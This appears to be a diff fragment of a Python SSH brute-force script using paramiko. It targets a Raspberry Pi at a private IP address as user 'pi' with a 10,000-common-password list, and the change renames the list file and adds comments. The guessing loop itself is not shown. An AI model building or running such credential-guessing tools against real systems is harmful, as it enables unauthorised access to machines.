@@ -3,7 +3,10 @@ import paramiko
 # Target Raspberry Pi details
 target_ip = "10.60.161.60"
 username = "pi"
-password_file = r"10k-most-common.txt"
+
+# Make sure you have your text file with the passwords
+# here and that the name is correct
+password_file = r"10k-most-common-passwords.txt"
 
 # Function to try SSH login
 def ssh_bruteforce():
